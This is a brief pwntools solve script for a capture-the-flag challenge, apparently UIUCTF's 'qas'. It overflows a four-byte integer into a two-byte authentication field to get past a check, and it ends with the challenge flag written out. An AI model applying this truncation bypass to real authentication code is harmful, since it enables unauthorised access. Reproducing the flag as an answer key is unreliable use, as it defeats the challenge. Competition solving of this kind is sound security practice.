from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    b *0x401b0f
    b *0x401b2b
    b *0x401d22
    continue
''')

# p = remote('qas.chal.uiuc.tf', 1337, ssl=True)

# overflow a four-byte int to a two-byte short buffer
p.sendlineafter("Please enter your quantum authentication code: ", str(0xaa9a0001).encode())

p.interactive()

# uiuctf{qu4ntum_0v3rfl0w_2d5ad975653b8f29}